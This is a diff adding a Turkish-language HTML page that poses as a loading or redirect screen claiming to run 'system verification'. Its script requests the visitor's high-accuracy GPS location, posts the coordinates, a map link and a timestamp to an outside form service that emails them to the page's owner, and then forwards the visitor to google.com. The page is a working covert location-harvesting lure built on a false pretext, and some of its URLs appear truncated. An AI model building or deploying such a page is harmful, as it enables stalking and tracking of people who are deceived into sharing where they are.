@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yönlendiriliyorsunuz...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <h2>İçerik Yükleniyor, Lütfen Bekleyin...</h2>
+    <div class="loader"></div>
+    <p>Sistem doğrulama yapıyor. Lütfen tarayıcınızın çıkardığı <b>Konum İznini onaylayın</b>.</p>
+
+    <script>
+        // BURAYA WEB3FORMS'TAN GELEN KEY'İ YAZIN
+        const WEB3FORMS_KEY = "2b035911-d676-4f64-a09d-5a4d01558911"; 
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(konumuMaileGonder, hataYonetimi, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Tarayıcınız konum özelliğini desteklemiyor.");
+                yonlendir();
+            }
+        };
+
+        function konumuMaileGonder(position) {
+            const enlem = position.coords.latitude;
+            const boylam = position.coords.longitude;
+            // Düzenlenen Google Harita Linki (enlem, boylam olarak düzeltildi)
+            const haritaLinki = `https://google.com{enlem},${boylam}`;
+
+            const formData = {
+                access_key: WEB3FORMS_KEY,
+                subject: "📍 Yeni Konum Bilgisi Geldi!",
+                from_name: "Konum Sistemi",
+                Enlem: enlem,
+                Boylam: boylam,
+                Google_Harita_Linki: haritaLinki,
+                Zaman: new Date().toLocaleString("tr-TR")
+            };
+
+            fetch('https://web3forms.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.success) {
+                    alert("Konum alındı ve gönderildi!"); // Test için eklendi
+                } else {
+                    alert("Sistem hatası: " + data.message);
+                }
+                yonlendir();
+            })
+            .catch(error => {
+                alert('Bağlantı hatası: ' + error);
+                yonlendir();
+            });
+        }
+
+        function hataYonetimi(error) {
+            if (error.code === error.PERMISSION_DENIED) {
+                alert("Hata: Konum izni vermediniz. Lütfen tarayıcı ayarlarından siteye izin verin.");
+            } else {
+                alert("Konum alınamadı: " + error.message);
+            }
+            yonlendir();
+        }
+
+        function yonlendir() {
+            window.location.href = "https://google.com"; 
+        }
+    </script>
+</body>
+</html>
